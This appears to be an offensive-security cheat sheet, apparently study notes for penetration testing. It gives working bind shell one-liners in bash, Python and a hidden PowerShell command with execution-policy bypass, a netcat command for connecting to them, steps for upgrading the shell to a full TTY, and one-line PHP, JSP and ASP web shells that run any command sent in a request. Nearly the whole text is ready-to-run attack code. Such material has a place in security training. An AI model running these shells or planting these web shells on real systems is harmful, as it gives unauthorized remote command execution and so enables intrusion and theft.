**NOTE:** we are listening to port `1234`, change it as you would like
#### Bind Shells
[bind shell cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/)

The following are reliable commands we can use to start a bind shell:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```
OR
```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```
OR
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

---
#### Netcat Connection
We can use `netcat` to connect to that port and get a connection to the shell:
```shell-session
nc 10.10.10.1 1234
```

---
#### Upgrading TTY
In our `netcat` shell, we will use the following command to use python to upgrade the type of our shell to a full TTY:
```shell-session
python -c 'import pty; pty.spawn("/bin/bash")'
```
hit `ctrl+z` to background our shell and get back on our local terminal, and input the following `stty` command:
```shell-session
$ stty raw -echo
$ fg
```
Once we hit `fg`, it will bring back our `netcat` shell to the foreground. At this point, the terminal will show a blank line. We can hit `enter` again to get back to our shell or input `reset` and hit enter to bring it back.

##### FIX SHELL DOESNT COVER ENTIRE TERMINAL

We may notice that our shell does not cover the entire terminal. To fix this, we need to figure out a few variables. We can open another terminal window on our system, maximize the windows or use any size we want.
```shell-session
$ echo $TERM

xterm-256color
$ stty size

67 318
```

Now that we have our variables, we can go back to our `netcat` shell and use the following command to correct them:
```shell-session
www-data@remotehost$ export TERM=xterm-256color

www-data@remotehost$ stty rows 67 columns 318
```

---
#### Web Shell
The following are some common short web shell scripts for common web languages:
```php
<?php system($_REQUEST["cmd"]); ?>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```asp
<% eval request("cmd") %>
```

